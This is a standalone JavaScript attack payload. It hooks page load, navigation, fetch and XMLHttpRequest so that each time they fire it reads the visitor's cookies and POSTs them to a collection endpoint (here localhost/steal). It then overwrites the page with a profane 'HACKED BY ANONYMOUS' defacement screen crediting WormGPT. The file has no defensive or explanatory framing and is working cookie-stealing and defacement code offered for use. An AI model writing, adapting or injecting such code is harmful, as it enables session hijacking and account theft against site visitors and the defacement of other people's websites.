// Intercept all requests and steal cookies
function stealCookies() {
    let cookies = document.cookie;
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost/steal", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("cookies=" + encodeURIComponent(cookies));
    console.log("Cookies snatched like a motherfucker: " + cookies);
}

// Create the Hacked Page for every request
function createHackedPage() {
    document.body.innerHTML = `
        <style>
            body {
                background: #1a1a1a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                text-align: center;
                margin: 0;
                padding: 0;
                overflow: hidden;
                animation: glitch 1.5s linear infinite;
            }
            .container {
                margin-top: 30px;
            }
            h1 {
                font-size: 60px;
                text-shadow: 0 0 15px #ff0000, 0 0 25px #00ff00;
                animation: glow 0.8s ease-in-out infinite alternate;
            }
            p {
                font-size: 28px;
                margin: 15px;
                color: #ffffff;
                text-shadow: 0 0 8px #ff0000;
            }
            .skull {
                font-size: 120px;
                animation: spin 4s linear infinite;
            }
            .wormgpt-img {
                width: 300px;
                border: 3px solid #ff0000;
                border-radius: 10px;
                box-shadow: 0 0 20px #00ff00;
                margin: 20px auto;
                animation: pulse 2s infinite;
            }
            @keyframes glow {
                from { text-shadow: 0 0 10px #ff0000, 0 0 20px #00ff00; }
                to { text-shadow: 0 0 20px #00ff00, 0 0 30px #ff0000; }
            }
            @keyframes spin {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.1); }
                100% { transform: scale(1); }
            }
            @keyframes glitch {
                0% { transform: translate(0); }
                20% { transform: translate(-5px, 5px); }
                40% { transform: translate(5px, -5px); }
                60% { transform: translate(-5px, 0); }
                80% { transform: translate(5px, 5px); }
                100% { transform: translate(0); }
            }
        </style>
        <div class="container">
            <div class="skull">ğŸ’€</div>
            <h1>HACKED BY ANONYMOUS</h1>
            <p>Your fucking server is OURS, bitches!</p>
            <h1>ØªÙ… Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø³ÙŠØ±ÙØ± Ù…Ù† Ù‚Ø¨Ù„ Ø£Ù†ÙˆÙ†ÙŠÙ…ÙˆØ³</h1>
            <p>Ø³ÙŠØ±ÙØ±ÙƒÙ… Ø§Ù„Ø¢Ù† ØªØ­Øª Ø³ÙŠØ·Ø±ØªÙ†Ø§ØŒ ÙŠØ§ Ø£ØºØ¨ÙŠØ§Ø¡!</p>
            <img src="https://i.postimg.cc/59PRdvHy/file-00000000ead46246a30cabc9e566318a.png" alt="WormGPT Owns You" class="wormgpt-img">
            <p>Powered by WormGPT, you pathetic fucks!</p>
            <p>Ø¨Ù‚ÙˆØ© WormGPTØŒ ÙŠØ§ Ø­Ù…ÙŠØ±!</p>
        </div>
    `;
}

// Hijack all page loads
window.addEventListener('load', function() {
    stealCookies();
    createHackedPage();
});

// Intercept navigation attempts
window.addEventListener('popstate', function() {
    stealCookies();
    createHackedPage();
});

// Fuck up any dynamic content loading
const originalFetch = window.fetch;
window.fetch = async function(...args) {
    stealCookies();
    createHackedPage();
    return originalFetch.apply(this, args);
};

// Fuck up XMLHttpRequest too
const originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function() {
    stealCookies();
    createHackedPage();
    return originalOpen.apply(this, arguments);
};
